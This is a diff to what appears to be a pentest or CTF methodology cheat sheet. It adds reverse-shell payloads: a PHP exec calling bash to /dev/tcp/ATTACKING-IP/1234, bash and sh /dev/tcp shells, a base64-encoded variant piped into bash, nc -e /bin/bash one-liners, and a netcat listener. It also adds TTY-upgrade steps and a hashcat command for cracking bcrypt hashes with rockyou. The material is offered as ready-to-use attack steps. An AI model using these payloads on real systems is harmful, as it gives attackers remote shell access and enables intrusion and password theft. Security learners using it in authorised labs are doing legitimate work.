@@ -111,19 +111,32 @@ you can use ls and get FILENAME
 ```
 ### 3. Exploit
 #### 3.2 Reverse shell
-- reverse shell linux [hacktricks.xyz/reverse-shells/linux](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux)
+reverse shell linux [hacktricks.xyz/reverse-shells/linux](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux)  
+**PHP revershell**  
 ```php
 <?php exec("/bin/bash -c 'bash -i > /dev/tcp/ATTACKING-IP/1234 0>&1'");
-#simple balise php
 ```
+**bash and netcat revershell**
 ```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")' #run pseudo temrinal with /bin/bash instance
+#victim
+/bin/bash -i >& /dev/tcp/0.0.0.0/1234 0>&1
+/bin/sh -i >& /dev/tcp/0.0.0.0/1234 0>&1
+echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzAuMC4wLjAvMTIzNCAwPiYx' | base64 -d | bash
+#you
+nc -lvnp 1234
 ```
+
 ```bash
-export TERM=xterm #determine type of terminal in use
+nc -e /bin/bash 0.0.0.0 1234
+nc -c /bin/bash 0.0.0.0 1234
 ```
+
+**When you have a shell**  
+run pseudo temrinal with /bin/bash instance, determine type of terminal in use and foreground last processes in running  
 ```bash
-stty raw -echo; fg #foreground last processes in running
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+stty raw -echo;
 ```
 #### 3.3 Password bruteforce  
 before bruteforce prefer to find a valid username because combination of bruteforce username and password is very very long  
@@ -183,6 +196,10 @@ PBKDF2: Variable-length hash, typically 32-64 characters long, with a salt value
 Argon2: Variable-length hash, typically 32-64 characters long, with a salt value and a work factor (iterations).
 ```
 - hascat
+`-m 0` is for tell to hashcat is MD5 and  `-m 3200` is bcrypt
+```
+hascat hash.txt -m 3200 rockyou.txt
+```
 ### 4. escalation privilege LINUX
 #### **Basic enumaration**
 - You need to search about kernel version, user and group, services, logs, host directory,.... 
